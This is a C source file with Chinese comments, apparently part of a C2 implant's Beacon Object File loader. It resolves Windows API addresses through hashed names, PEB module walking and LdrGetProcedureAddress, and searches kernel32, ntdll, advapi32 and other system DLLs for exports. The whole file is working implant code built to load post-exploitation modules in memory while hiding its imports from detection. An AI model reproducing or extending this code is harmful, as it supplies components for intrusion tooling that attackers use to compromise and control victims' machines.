#include "beacon_bof_internal.h"

/* 在执行 BOF 前填充 LdrApi 表，从 ctx->api 获取函数指针 */
VOID BofInitLdrApi(BofJobRuntime* runtime, BeaconContext* ctx)
{
    if (!runtime || !ctx) return;

    /* 兼容 BOF 侧旧导入名，同时内部函数名保持 Windows 风格。 */
    runtime->ldr_api[0].NameHash = TOWIDECHAR_HASH;
    runtime->ldr_api[0].Pointer  = (PVOID)ToWideCharA;
    runtime->ldr_api[1].NameHash = LOADLIBRARYA_HASH;
    runtime->ldr_api[1].Pointer  = (PVOID)ctx->api.pfnLoadLibraryA;
    runtime->ldr_api[2].NameHash = GETPROCADDRESS_HASH;
    runtime->ldr_api[2].Pointer  = (PVOID)ctx->api.pfnGetProcAddress;
    runtime->ldr_api[3].NameHash = FREELIBRARY_HASH;
    runtime->ldr_api[3].Pointer  = (PVOID)ctx->api.pfnFreeLibrary;
    runtime->ldr_api[4].NameHash = GETMODULEHANDLEA_HASH;
    runtime->ldr_api[4].Pointer  = (PVOID)ctx->api.pfnGetModuleHandleA;
    runtime->ldr_api[5].NameHash = 0;
    runtime->ldr_api[5].Pointer  = NULL;
}

/* 从指定 DLL 解析导出函数地址 */
BOOL BofResolveDllProc(BofJobRuntime* runtime, PCHAR moduleName, PCHAR procName, PVOID* procAddr)
{
    CHAR dllName[128] = { 0 };
    ANSI_STRING ansiStr = { 0 };
    BeaconContext* ctx;
    HMODULE hModule;

    if (!runtime || !moduleName || !procName || !procAddr) return FALSE;
    ctx = runtime->ctx;
    if (!ctx) return FALSE;
    *procAddr = NULL;

    if (!BofCopyString(dllName, sizeof(dllName), moduleName) ||
        !BofAppendDllSuffix(dllName, sizeof(dllName))) {
        return FALSE;
    }

    hModule = GetModuleByPeb(BofHashString(dllName, (ULONG)BofStrLen(dllName), TRUE));

    if (!hModule && ctx->api.pfnLoadLibraryA) {
        hModule = ctx->api.pfnLoadLibraryA(dllName);
    }
    if (!hModule) return FALSE;

    if (ctx->api.pfnLdrGetProcedureAddress) {
        ansiStr.Length        = (USHORT)BofStrLen(procName);
        ansiStr.MaximumLength = ansiStr.Length + sizeof(CHAR);
        ansiStr.Buffer        = procName;

        if (ctx->api.pfnLdrGetProcedureAddress(hModule, &ansiStr, 0, procAddr) == 0 &&
            *procAddr != NULL) {
            return TRUE;
        }
    }

    if (ctx->api.pfnGetProcAddress) {
        *procAddr = (PVOID)ctx->api.pfnGetProcAddress(hModule, procName);
    }

    return *procAddr != NULL;
}

/* 在常见系统 DLL 中查找导出函数 */
BOOL BofResolveCommonProc(BofJobRuntime* runtime, PCHAR procName, PVOID* procAddr)
{
    static CHAR* modules[] = {
        "kernel32.dll",
        "kernelbase.dll",
        "user32.dll",
        "advapi32.dll",
        "msvcrt.dll",
        "ntdll.dll",
        NULL
    };

    DWORD i;

    for (i = 0; modules[i]; i++) {
        if (BofResolveDllProc(runtime, modules[i], procName, procAddr)) {
            return TRUE;
        }
    }

    return FALSE;
}
